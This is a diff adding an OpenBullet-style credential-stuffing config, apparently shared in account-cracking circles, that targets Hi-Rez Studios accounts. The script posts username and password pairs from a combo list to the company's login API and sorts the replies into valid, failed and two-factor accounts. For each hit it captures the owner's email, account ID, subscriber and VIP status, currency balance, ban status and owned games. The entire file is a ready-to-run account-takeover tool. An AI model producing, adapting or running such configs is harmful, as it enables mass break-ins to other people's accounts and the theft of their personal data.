@@ -1,0 +1,71 @@
+[SETTINGS]
+{
+  "Name": "HirezStudios",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-17T07:02:06.2438981+02:00",
+  "AdditionalInfo": "",
+  "Author": "xKeksbyte",
+  "Version": "1.2.8 Modded",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Auth_Login_Page REQUEST GET "https://my.hirezstudios.com/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Post_Login REQUEST POST "https://api.hirezstudios.com/acct/login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36" 
+  HEADER "Origin: https://my.hirezstudios.com" 
+  HEADER "Referer: https://my.hirezstudios.com/" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Your username and password combination failed authentication. Please try again" 
+  KEYCHAIN Success OR 
+    KEY "\"user\":\"" 
+    KEY "\",\"webToken\":\"" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "\"verifiedDate\":null" 
+    KEY "verified\":false" 
+
+#Username PARSE "<SOURCE>" LR "{\"user\":\"" "\",\"" -> CAP "Username" 
+
+#AccountID PARSE "<SOURCE>" LR "{\"accountId\":" ",\"" -> CAP "accountID" 
+
+#Email PARSE "<SOURCE>" LR "\":{\"email\":\"" "\",\"" -> CAP "Email" 
+
+#Subscriber PARSE "<SOURCE>" LR ",\"subscriber\":" ",\"" -> CAP "IsSubscriber" 
+
+#Vip PARSE "<SOURCE>" LR "\",\"vip\":" ",\"" -> CAP "IsVIP" 
+
+#Currency PARSE "<SOURCE>" LR ",\"currency\":\"" "\",\"" -> CAP "Currency" 
+
+#Created PARSE "<SOURCE>" LR "\",\"createdDate\":\"" "-" -> CAP "CreatedDate" 
+
+#Banned PARSE "<SOURCE>" LR ",\"banned\":" ",\"" -> CAP "IsBanned" 
+
+#Games PARSE "<SOURCE>" LR ",\"games\":[{\"game\":\"" "\",\"" -> CAP "Games" 
+
